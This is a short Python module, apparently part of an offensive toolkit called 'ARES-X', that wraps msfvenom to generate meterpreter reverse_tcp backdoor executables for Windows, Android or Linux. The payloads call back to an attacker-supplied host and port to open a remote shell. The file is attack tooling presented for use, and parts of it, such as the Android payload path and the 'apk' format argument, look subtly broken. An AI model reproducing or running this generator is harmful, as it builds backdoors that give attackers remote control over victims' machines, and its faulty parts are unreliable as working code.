# ARES-X File 20: MSFVenom Automation
import os

def generate_payload(lhost, lport, platform="windows", arch="x64"):
    """Generates a professional-grade reverse shell payload."""
    extension = "exe" if platform == "windows" else "apk" if platform == "android" else "elf"
    output = f"payloads/backdoor_{platform}.{extension}"
    
    # Command string for Metasploit engine
    cmd = f"msfvenom -p {platform}/{arch}/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f {extension} -o {output}"
    
    print(f"[!] ARES-X: Forging {platform} payload...")
    os.system(cmd)
    return output
